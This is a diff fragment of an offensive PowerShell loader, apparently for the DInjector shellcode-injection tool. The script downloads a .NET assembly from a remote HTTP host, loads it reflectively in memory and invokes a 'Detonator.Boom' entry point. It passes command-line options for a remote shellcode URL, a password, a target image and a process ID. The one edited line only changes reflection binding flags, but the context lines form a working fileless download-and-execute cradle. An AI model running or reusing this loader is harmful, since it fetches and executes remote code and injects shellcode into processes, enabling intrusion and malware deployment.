@@ -91,7 +91,7 @@ $cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppi
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
 
-$flags = [Reflection.BindingFlags] "NonPublic,Static"
+$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"
 
 $class = $assem.GetType("DInjector.Detonator", $flags)
 $entry = $class.GetMethod("Boom", $flags)
